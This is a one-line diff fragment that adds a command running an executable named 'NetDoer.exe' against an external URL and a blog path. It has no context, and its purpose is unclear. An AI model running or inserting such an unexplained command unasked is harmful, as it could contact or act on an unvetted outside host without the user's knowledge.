@@ -1,0 +1,1 @@
+NetDoer.exe http://www.pcibor.cba.pl /blog/index.php
